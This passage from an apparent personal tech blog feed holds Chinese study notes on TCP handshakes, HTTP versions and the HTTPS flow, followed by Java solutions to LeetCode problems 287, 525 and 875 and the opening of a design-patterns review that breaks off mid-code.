加1，即X+1。 发送完毕后，服务器端进入 SYN_RCVD 状态。</p><h3 id="3-第三次握手ack1acknumy1"><a class="markdownIt-Anchor" href="#3-第三次握手ack1acknumy1"></a> 3. 第三次握手(ACK=1，ACKnum=y+1)</h3><p>客户端再次发送确认包(ACK)，SYN 标志位为0，ACK 标志位为1，并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在数据段放写ISN的+1</p><p>发送完毕后，客户端进入 ESTABLISHED 状态，当服务器端接收到这个包时，也进入 ESTABLISHED 状态，TCP 握手结束。</p><h2 id="四次挥手"><a class="markdownIt-Anchor" href="#四次挥手"></a> 四次挥手</h2><p><img src="img/(2020-08-12)%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E9%80%9F%E6%9F%A5.md/2020-08-12-20-38-05.png" alt="" /></p><h3 id="1-第一次挥手fin1seqx"><a class="markdownIt-Anchor" href="#1-第一次挥手fin1seqx"></a> 1. 第一次挥手(FIN=1，seq=x)</h3><p>假设客户端想要关闭连接，客户端发送一个 FIN 标志位置为1的包，表示自己已经没有数据可以发送了，但是仍然可以接受数据。</p><p>发送完毕后，客户端进入 FIN_WAIT_1 状态。</p><h3 id="2-第二次挥手ack1acknumx1"><a class="markdownIt-Anchor" href="#2-第二次挥手ack1acknumx1"></a> 2. 第二次挥手(ACK=1，ACKnum=x+1)</h3><p>服务器端确认客户端的 FIN 包，发送一个确认包，表明自己接受到了客户端关闭连接的请求，但还没有准备好关闭连接。</p><p>发送完毕后，服务器端进入 CLOSE_WAIT 状态，客户端接收到这个确认包之后，进入 FIN_WAIT_2 状态，等待服务器端关闭连接。</p><h3 id="3-第三次挥手fin1seqy"><a class="markdownIt-Anchor" href="#3-第三次挥手fin1seqy"></a> 3. 第三次挥手(FIN=1，seq=y)</h3><p>服务器端准备好关闭连接时，向客户端发送结束连接请求，FIN 置为1。</p><p>发送完毕后，服务器端进入 LAST_ACK 状态，等待来自客户端的最后一个ACK。</p><h3 id="4-第四次挥手ack1acknumy1"><a class="markdownIt-Anchor" href="#4-第四次挥手ack1acknumy1"></a> 4. 第四次挥手(ACK=1，ACKnum=y+1)</h3><p>客户端接收到来自服务器端的关闭请求，发送一个确认包，并进入 TIME_WAIT状态，等待可能出现的要求重传的 ACK 包。</p><p>服务器端接收到这个确认包之后，关闭连接，进入 CLOSED 状态。</p><p>客户端等待了某个固定时间（两个最大段生命周期，2MSL，2 Maximum Segment Lifetime）之后，没有收到服务器端的 ACK ，认为服务器端已经正常关闭连接，于是自己也关闭连接，进入 CLOSED 状态。</p><h1 id="http"><a class="markdownIt-Anchor" href="#http"></a> HTTP</h1><h2 id="版本区别"><a class="markdownIt-Anchor" href="#版本区别"></a> 版本区别</h2><h3 id="http-10"><a class="markdownIt-Anchor" href="#http-10"></a> HTTP 1.0</h3><p>HTTP 1.0规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求。</p><p>多次请求需要重新握手多次，开销太大，无法复用连接</p><h3 id="http-11"><a class="markdownIt-Anchor" href="#http-11"></a> HTTP 1.1</h3><p>HTTP 1.1支持持久连接（HTTP/1.1的默认模式使用带流水线的持久连接），在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟。一个包含有许多图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。HTTP 1.1还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容，这样也显著地减少了整个下载过程所需要的时间。</p><h3 id="http-20"><a class="markdownIt-Anchor" href="#http-20"></a> HTTP 2.0</h3><p>多路复用允许同时通过单一的 HTTP/2 连接发起多重的请求-响应消息。在 HTTP/1.1 协议中浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞。HTTP/2在 应用层(HTTP/2)和传输层(TCP or UDP)之间增加一个二进制分帧层。在不改动 HTTP/1.x 的语义、方法、状态码、URI 以及首部字段的情况下, 解决了HTTP1.1 的性能限制，改进传输性能，实现低延迟和高吞吐量。</p><h2 id="https-基本流程"><a class="markdownIt-Anchor" href="#https-基本流程"></a> HTTPS 基本流程</h2><ul><li>客户端发送一个 ClientHello 消息到服务器端，消息中同时包含了它的 Transport Layer Security (TLS) 版本，可用的加密算法和压缩算法。</li><li>服务器端向客户端返回一个 ServerHello 消息，消息中包含了服务器端的 TLS 版本，服务器所选择的加密和压缩算法，以及数字证书认证机构（Certificate Authority，缩写 CA）签发的服务器公开证书，证书中包含了公钥。客户端会使用这个公钥加密接下来的握手过程，直到协商生成一个新的对称密钥。证书中还包含了该证书所应用的域名范围（Common Name，简称 CN），用于客户端验证身份。</li><li>客户端根据自己的信任 CA 列表，验证服务器端的证书是否可信。如果认为可信（具体的验证过程在下一节讲解），客户端会生成一串伪随机数，使用服务器的公钥加密它。这串随机数会被用于生成新的对称密钥</li><li>服务器端使用自己的私钥解密上面提到的随机数，然后使用这串随机数生成自己的对称主密钥</li><li>客户端发送一个 Finished 消息给服务器端，使用对称密钥加密这次通讯的一个散列值</li><li>服务器端生成自己的 hash 值，然后解密客户端发送来的信息，检查这两个值是否对应。如果对应，就向客户端发送一个 Finished 消息，也使用协商好的对称密钥加密</li><li>从现在开始，接下来整个 TLS 会话都使用对称秘钥进行加密，传输应用层（HTTP）内容</li></ul><h1 id="socket"><a class="markdownIt-Anchor" href="#socket"></a> Socket</h1><ul><li>socket() 创建套接字</li><li>bind() 分配套接字地址</li><li>listen() 等待连接请求</li><li>accept() 允许连接请求</li><li>read()/write() 数据交换</li><li>close() 关闭连接</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;tcp&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#tcp&quot;&gt;&lt;/a&gt; TCP&lt;/h1&gt;
&lt;h2 id=&quot;报文结构&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#报文结构&quot;&gt;&lt;/a&gt; 报文结构&lt;/h2&gt;
&lt;</summary>
      
    
    
    
    <category term="面试" scheme="https://virgilchen97.github.io/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
    <category term="排序" scheme="https://virgilchen97.github.io/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>287. 寻找重复数</title>
    <link href="https://virgilchen97.github.io/2020/07/287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0/"/>
    <id>https://virgilchen97.github.io/2020/07/287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0/</id>
    <published>2020-07-26T14:27:21.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入: [1,3,4,2,2]</span><br><span class="line">输出: 2</span><br><span class="line"></span><br><span class="line">输入: [3,1,3,4,2]</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><ul><li>不能更改原数组（假设数组是只读的）。</li><li>只能使用额外的 O(1) 的空间。</li><li>时间复杂度小于 O(n^2) 。</li><li>数组中只有一个重复的数字，但它可能不止重复出现一次。</li></ul><h1 id="解法"><a class="markdownIt-Anchor" href="#解法"></a> 解法</h1><p>首先不考虑题目中 O(1) 的要求，第一个想到的肯定是用一个 Set。包括上 O(1) 的要求，那我们想到的会是将原本的数组当作 Set 来使用，出现过的数就将这个数对应的数组位置中的数变为负数，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1,3,4,2,2]</span><br></pre></td></tr></table></figure><p>遍历数组，首先到 1，因为数组中的数是 1 ~ n 而下标是 0 ~ n - 1，因此我们把位置在 0 的数变为负数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-1,3,4,2,2]</span><br></pre></td></tr></table></figure><p>同理，以此往复：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[-1,3,-4,2,2] 遇到 3，把 位置 2 的数变为负数</span><br><span class="line">[-1,3,-4,-2,2] 遇到 4，把 位置 3 的数变为负数</span><br><span class="line">[-1,-3,-4,-2,2] 遇到 2，把 位置 1 的数变为负数</span><br><span class="line">[-1,-3,-4,-2,2] 遇到 2，把 位置 1 的数已经是负数，所以 2 是重复的</span><br></pre></td></tr></table></figure><p>但是本题中又限制了<strong>不可以对原数组进行修改</strong>，因此我们将数组看作一个链表，如果数组中的元素有重复，那么这个链表中必定存在环。举个例子，还是数组，开始时我们位于位置 0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[(1),3,4,2,2]</span><br><span class="line">[1,(3),4,2,2] 位置 0 的数是 1， 跳到位置 1</span><br><span class="line">[1,3,4,(2),2] 位置 1 的数是 3， 跳到位置 3</span><br><span class="line">[1,3,(4),2,2] 位置 3 的数是 2， 跳到位置 2</span><br><span class="line">[1,3,4,2,(2)] 位置 2 的数是 4， 跳到位置 4</span><br><span class="line">[1,3,(4),2,2] 位置 4 的数是 2， 跳到位置 2 回到了之前的位置</span><br></pre></td></tr></table></figure><p>因此这个问题就等价转换成了寻找一个含有环的链表的环入口的问题。判断一个链表是否有环十分简单，我们只需要使用快慢指针即可，而寻找环的入口我们需要一个小小的证明：</p><p><img src="img/(2020-07-26)287-%E5%AF%BB%E6%89%BE%E9%87%8D%E5%A4%8D%E6%95%B0.md/2020-07-26-22-46-30.png" alt="" /></p><p>如图所示，环的入口点是 A，快慢指针相交的节点是 B，从链表头到入环节点 A 的长度是 a，A 顺时针 到 B 的距离是 b，B 顺时针到 A 的距离是 c。那么慢指针走过的距离就是 <code>a+b</code>，而快指针绕了一圈走过的距离是 <code>a+b+c+b</code>。而我们知道快指针走过的距离是慢指针的两倍。因此 <code>2*(a+b) = a + b + c + b</code>，也就是 <code>a = c</code>。</p><p>因此我们只需要在链表头添加一个新指针，和慢指针一同一次前进一个节点，两者相遇的点就是环入口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findDuplicate</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> fast = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(slow != fast || fast == <span class="number">0</span>)&#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[nums[fast]];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// i 是新的从链表头开始的指针</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i != slow; i = nums[i])&#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;给定一个包含 n + 1 个整数的数组 nums，其数字都在 1 到 n 之间（包括 1 和 n），可知至少存在一个重复的整数。假设只有一个重复的整数，找出这个重复的数。&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
      
    
    
    
    <category term="LeetCode" scheme="https://virgilchen97.github.io/categories/LeetCode/"/>
    
    
    <category term="链表" scheme="https://virgilchen97.github.io/tags/%E9%93%BE%E8%A1%A8/"/>
    
  </entry>
  
  <entry>
    <title>525-连续数组</title>
    <link href="https://virgilchen97.github.io/2020/07/525-%E8%BF%9E%E7%BB%AD%E6%95%B0%E7%BB%84/"/>
    <id>https://virgilchen97.github.io/2020/07/525-%E8%BF%9E%E7%BB%AD%E6%95%B0%E7%BB%84/</id>
    <published>2020-07-20T14:45:43.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个二进制数组, 找到含有相同数量的 0 和 1 的最长连续子数组（的长度）。<br />示例 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: [0,1]</span><br><span class="line">输出: 2</span><br><span class="line">说明: [0, 1] 是具有相同数量0和1的最长连续子数组。</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="解法"><a class="markdownIt-Anchor" href="#解法"></a> 解法</h1><h2 id="暴力超时"><a class="markdownIt-Anchor" href="#暴力超时"></a> 暴力（超时）</h2><p>首先求出所有 0 和 1 的前缀和，然后遍历所有可能，求出 0 和 1 相等的最长连续子数组：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMaxLength</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 求出前缀和</span></span><br><span class="line">        <span class="keyword">int</span>[][] count = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length][<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> countzero = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> countone = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                countzero++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                countone++;</span><br><span class="line">            &#125;</span><br><span class="line">            count[i][<span class="number">0</span>] = countzero;</span><br><span class="line">            count[i][<span class="number">1</span>] = countone;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 暴力找出最长数组</span></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (count[j][<span class="number">0</span>] - count[i-<span class="number">1</span>][<span class="number">0</span>] == count[j][<span class="number">1</span>] - count[i-<span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">                        max = Math.max(max, j - i + <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(count[j][<span class="number">0</span>] == count[j][<span class="number">1</span>])&#123;</span><br><span class="line">                        max = Math.max(max, j + <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="将-0-变为-1"><a class="markdownIt-Anchor" href="#将-0-变为-1"></a> 将 0 变为 -1</h2><p>我们将数组中的 0 全部变为 -1，再次求数组的前缀和，那么前缀和相等的两个点之间 0 和 1 的数目便是相等的，因为 +1 和 -1 的数量相同才会使得前缀和不变。</p><p>因此我们再求前缀和的过程中，若当前前缀和已经出现，则可以立刻找出从何处到当前位置的0，1数量相等，最后取max就看了一获得结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findMaxLength</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 把 0 变成 -1</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] == <span class="number">0</span>)&#123;</span><br><span class="line">                nums[i] = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理 sum = 0 的特殊情况</span></span><br><span class="line">        map.put(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(sum))&#123;</span><br><span class="line">                max = Math.max(max, i - map.get(sum));</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                map.put(sum, i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;给定一个二进制数组, 找到含有相同数量的 0 和 1 的最长连续子数组（的长度）。&lt;br /&gt;
示例 1:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;输入: [0,1]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;输出: 2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;说明: [0, 1] 是具有相同数量0和1的最长连续子数组。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://virgilchen97.github.io/categories/LeetCode/"/>
    
    
  </entry>
  
  <entry>
    <title>875-爱吃香蕉的珂珂</title>
    <link href="https://virgilchen97.github.io/2020/07/875-%E7%88%B1%E5%90%83%E9%A6%99%E8%95%89%E7%9A%84%E7%8F%82%E7%8F%82/"/>
    <id>https://virgilchen97.github.io/2020/07/875-%E7%88%B1%E5%90%83%E9%A6%99%E8%95%89%E7%9A%84%E7%8F%82%E7%8F%82/</id>
    <published>2020-07-17T08:43:00.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h1><p>珂珂喜欢吃香蕉。这里有 <code>N</code> 堆香蕉，第 <code>i</code> 堆中有 <code>piles[i]</code> 根香蕉。警卫已经离开了，将在 <code>H</code> 小时后回来。</p><p>珂珂可以决定她吃香蕉的速度 <code>K</code> （单位：根/小时）。每个小时，她将会选择一堆香蕉，从中吃掉 <code>K</code> 根。如果这堆香蕉少于 <code>K</code> 根，她将吃掉这堆的所有香蕉，然后这一小时内不会再吃更多的香蕉。</p><p>珂珂喜欢慢慢吃，但仍然想在警卫回来前吃掉所有的香蕉。</p><p>返回她可以在 <code>H</code> 小时内吃掉所有香蕉的最小速度 <code>K</code>（<code>K</code> 为整数）。</p><span id="more"></span><h1 id="解法"><a class="markdownIt-Anchor" href="#解法"></a> 解法</h1><h2 id="二分查找"><a class="markdownIt-Anchor" href="#二分查找"></a> 二分查找</h2><p>我们可以使用二分查找的方式来查找珂珂吃香蕉的速度，我们可以知道的是珂珂吃香蕉速度的下界是 1 （0 的话珂珂还爱吃香蕉吗），上界则是 <code>max(piles)</code>（超过了也不会加快吃香蕉的速度了）。因此我们可以写出对应的二分查找算法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minEatingSpeed</span><span class="params">(<span class="keyword">int</span>[] piles, <span class="keyword">int</span> H)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先找到 Max</span></span><br><span class="line">        <span class="keyword">int</span> max = Integer.MIN_VALUE;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> pile:piles)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pile &gt; max)&#123;</span><br><span class="line">                max = pile;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下界是 1，上界是max</span></span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> r = max;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="comment">// 防止溢出</span></span><br><span class="line">            <span class="keyword">int</span> m = l + (r-l) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 计算吃完的时间</span></span><br><span class="line">            <span class="keyword">int</span> totalTime = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> pile:piles)&#123;</span><br><span class="line">                <span class="comment">// 变相取整，避免类型转换和计算浮点数</span></span><br><span class="line">                <span class="comment">// totalTime += (int)Math.ceil((double)pile / m);</span></span><br><span class="line">                totalTime += (pile - <span class="number">1</span>) / m + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(totalTime &lt;= H)&#123;</span><br><span class="line">                <span class="comment">// 如果时间小，当前的速度是不是正好我们不知道，所以还要考虑</span></span><br><span class="line">                <span class="comment">// 因此不是 r = m - 1;</span></span><br><span class="line">                r = m;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// 如果时间大，那么当前速度一定不可行</span></span><br><span class="line">                l = m + <span class="number">1</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;题目&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#题目&quot;&gt;&lt;/a&gt; 题目&lt;/h1&gt;
&lt;p&gt;珂珂喜欢吃香蕉。这里有 &lt;code&gt;N&lt;/code&gt; 堆香蕉，第 &lt;code&gt;i&lt;/code&gt; 堆中有 &lt;code&gt;piles[i]&lt;/code&gt; 根香蕉。警卫已经离开了，将在 &lt;code&gt;H&lt;/code&gt; 小时后回来。&lt;/p&gt;
&lt;p&gt;珂珂可以决定她吃香蕉的速度 &lt;code&gt;K&lt;/code&gt; （单位：根/小时）。每个小时，她将会选择一堆香蕉，从中吃掉 &lt;code&gt;K&lt;/code&gt; 根。如果这堆香蕉少于 &lt;code&gt;K&lt;/code&gt; 根，她将吃掉这堆的所有香蕉，然后这一小时内不会再吃更多的香蕉。&lt;/p&gt;
&lt;p&gt;珂珂喜欢慢慢吃，但仍然想在警卫回来前吃掉所有的香蕉。&lt;/p&gt;
&lt;p&gt;返回她可以在 &lt;code&gt;H&lt;/code&gt; 小时内吃掉所有香蕉的最小速度 &lt;code&gt;K&lt;/code&gt;（&lt;code&gt;K&lt;/code&gt; 为整数）。&lt;/p&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://virgilchen97.github.io/categories/LeetCode/"/>
    
    
    <category term="二分查找" scheme="https://virgilchen97.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    
  </entry>
  
  <entry>
    <title>设计模式复习</title>
    <link href="https://virgilchen97.github.io/2020/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%8D%E4%B9%A0/"/>
    <id>https://virgilchen97.github.io/2020/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%A4%8D%E4%B9%A0/</id>
    <published>2020-06-30T15:14:23.000Z</published>
    <updated>2022-01-26T13:48:43.537Z</updated>
    
    <content type="html"><![CDATA[<h1 id="创建型模式"><a class="markdownIt-Anchor" href="#创建型模式"></a> 创建型模式</h1><h3 id="工厂模式"><a class="markdownIt-Anchor" href="#工厂模式"></a> 工厂模式</h3><blockquote><p>定义一个用于创建对象的接口，让子类决定实例化哪一个类。</p></blockquote><p>Factory Method使一个类的实例化延迟到其子类。当客户端需要一个对象的实例时，会去向工厂获取而不是自己创建。通常我们会将工厂和其产品都定义为接口，客户端都调用接口方法。例如我们有对象 <code>Car</code> 和其对应的 <code>CarFactory</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 工厂接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">CarFactory</span> </span>&#123;</span><br><span class="line">    <span class="function">Car <span class="title">getCar</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Car 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Car</span> 